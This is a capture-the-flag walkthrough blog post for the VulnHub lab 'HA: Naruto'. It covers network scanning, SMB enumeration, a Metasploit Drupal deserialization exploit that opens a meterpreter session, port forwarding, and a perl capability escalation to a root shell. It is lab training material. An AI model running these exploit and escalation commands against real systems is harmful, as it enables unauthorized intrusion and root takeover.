<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">HA: Naruto Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/ha-naruto-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-10-24T15:21:57+00:00">October 24, 2019</time><time class="updated" datetime="2025-06-10T20:11:00+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This is our Walkthrough for “HA: Naruto” and this CTF is designed by Hacking Articles Team, hope you will enjoy this.</span></p>
<p><span style="color: #000000;">Book your tickets to The Konohagakure, and train under Master Jiraiya,  Hokage Uzumaki, and Tsunade.  Use your hacking skills to stop Orrochimaru and Rescue Sasuke.  Hack this boot to root and get  the  title  of  “The Number  One  Hyperactive,  Knucklehead  Ninja”</span></p>
<p><span style="color: #000000;">Level:Easy</span></p>
<p><span style="color: #000000;">You can download this lab from <a href="https://www.vulnhub.com/entry/ha-naruto,381/"><strong>here</strong></a>.</span></p>
<p><span style="color: #000000;"><strong>Let’s Begin!!</strong></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodologies</strong></span></h3>
<p><span style="color: #000000;"><strong>Scanning Network</strong></span></p>
<ul>
<li><span style="color: #000000;">netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration </strong></span></p>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Samba Client (Smb Client)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Drupal-Metasploit</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Capabilities</span></li>
</ul>
<h3><span style="color: #800000;"><u>Network Scanning</u></span></h3>
<p><span style="color: #000000;">Firsts of all we try to identify our target and for this use the following command:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;">Now we will run an aggressive port scan using Nmap to gain the information about the open ports and the services running on the target machine.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.0.4</pre>
<p><span style="color: #000000;">With the help of the scan, we now know that port number 80,22,139 and 445 are open with Apache, SSH and Smb service running.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rEw0CmL3etY/XbG_ONU5FqI/AAAAAAAAhGQ/_n7cGl2R4Fwiw_E74o9LoZrBvc6edzX4gCLcBGAsYHQ/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><u>Enumeration </u></span></h3>
<p><span style="color: #000000;">Further, we started enumeration against the target machine and therefore we navigated to a web browser for exploring HTTP service. And we got a page of Naruto as shown below: –</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gDcc_J4B_ms/XbG_OMDdtOI/AAAAAAAAhGU/HJHM2_kN3ygbdlxR4ptcpeQWvRxcWxBFwCLcBGAsYHQ/s1600/2.png"/></span></p>
<p><span style="color: #000000;"><u>Smbclient</u></span></p>
<p><span style="color: #000000;">Smbclient is a customer that can ‘converse with’ an SMB server. It offers an interface like that of the FTP program. It can perform activities like getting records from the server to the nearby machine, putting documents from the neighborhood machine to the server, recovering catalog data from the server.</span></p>
<p><span style="color: #000000;">We used the following command to view files in smbclient.</span></p>
<pre class="lang:default decode:true">smbclient -L \\192.168.0.4</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vwRioot6jus/XbG_OFKUnlI/AAAAAAAAhGM/6Az893aiJnwEj2UI9x49GYEveN7pNIkYwCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">As we can observe with the help of smbclient we are able to view the shared folder and files of the victim’s machine. Moreover, we can use smbclient for sharing a file in the network. Therefore, we found a text file by name of uzumaki.txt which we downloaded into our machine by using the following command.</span></p>
<pre class="lang:default decode:true">smbclient //192.168.0.4/Naruto</pre>
<p><span style="color: #000000;">Then we used the cat command to open the text file and got a hint “Gara” as we saw that word is in double-quotes in the text file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zOf-I7BXyWU/XbG_O18bM7I/AAAAAAAAhGY/pRYPPMoQOoAHJcOIzbnsxZa7AUlHWXnZQCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We tried this hint and opened it on the browser page where we got a Welcome page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-spTdH5rT0U0/XbG_Pb7i9_I/AAAAAAAAhGc/j9Rvf6WAf-Y_HqwZWWcyVaqiJYVwZ1qvQCLcBGAsYHQ/s1600/5.png"/></span></p>
<h3><span style="color: #800000;"><u>Exploitation</u></span></h3>
<p><span style="color: #000000;">Now we will use our old friend Metasploit to exploit the Drupal Page we found earlier.</span></p>
<pre class="lang:default decode:true">msf5 &gt; use exploit/unix/webapp/drupal_restws_unserialize
msf5 exploit (unix/webapp/ drupal_restws_unserialize) &gt; set rhosts 192.168.0.4
msf5 exploit (unix/webapp/ drupal_restws_unserialize) &gt; set targeturi /gara
msf5 exploit (unix/webapp/ drupal_restws_unserialize) &gt; set lhost 192.168.0.5
msf5 exploit (unix/webapp/ drupal_restws_unserialize) &gt; exploit</pre>
<p><span style="color: #000000;">Booom!! Our favourite meterpreter session is all here, let’s go for Post enumeration.</span></p>
<p><span style="color: #000000;">After getting into the meterpreter session we used the “shell” command to get a shell on the target system. This came back to be an improper shell.</span></p>
<p><span style="color: #000000;">Now we used our python one-liner to invoke a proper shell on the target machine. After getting the shell we saw that the shell we got is of user “www-data”.</span></p>
<pre class="lang:default decode:true">python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
<p><span style="color: #000000;">We will go for the post enumeration using the following command which shows us all the connections with their ports.</span></p>
<pre class="lang:default decode:true">netstat -antp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-C7IFXXIY5C0/XbG_PTdXDjI/AAAAAAAAhGg/zaA85uzjp4IE3Ob6hEHdGs1MHcnEM4IygCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">If we check our local network static for TCP and UDP connections, we will see that there’s something running 8080 and even nmap doesn’t display anything for this. With the aid of the meterpreter, we have forwarded service port 8080 to our local host:8080.</span></p>
<pre class="lang:default decode:true">portfwd add -l 8080 -p 8080 -r 127.0.0.1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lx61jKktnWg/XbG_PgrMZDI/AAAAAAAAhGk/krk_5iCt_vsNgC2etwCBsXCvUVr3w05kACLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Once we have forwarded the service over to our local machine then we can explore it the web browser as we have done here.</span></p>
<p><span style="color: #000000;">This will provide us with the following credentials:</span></p>
<pre class="lang:default decode:true">User: yashika
Password: raj@123</pre>
<h3><span style="color: #800000;"><u>Privilege Escalation</u></span></h3>
<p><span style="color: #000000;">Now we got to do is run su command which will give all root permissions to that user and therefore we successfully logged in using the following credentials:</span></p>
<pre class="lang:default decode:true">su yashika
raj@123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LUCcWFNfu0c/XbG_P49neyI/AAAAAAAAhGo/sMZTi45rA9MGC-op8H4FMPucAzwLTdZtQCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">In Linux, files can be provided with a capability to access specific files majorly critical files with specific permissions only; like a script file can be provided with the capability to read ssh configuration files or /etc/shadow file which can be done using getcap  so we will use the following command to find out the capabilities of the user and whether those capabilities are enabled or not:</span></p>
<pre class="lang:default decode:true">getcap -r / 2&gt;/dev/null</pre>
<pre class=""><code>./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</code></pre>
<pre class="lang:default decode:true">id
cd /root
ls
cat final.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--kfMzHHlN9U/XbG_QcXcqyI/AAAAAAAAhGs/yTgAAqXMkQAeKESLIBzvn0zjFRnVF9apQCLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;">And so, we found our Hero: NARUTO (“The Number One Hyperactive, Knucklehead Ninja”)</span></p>
<p><span style="color: #000000;"><strong>Author: Rishabh Kant</strong> is a Penetration tester, Certified Ethical Hacker and researcher Contact <a style="color: #000000;" href="https://www.linkedin.com/in/rishabh-kant-46a06814b/"><strong>here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
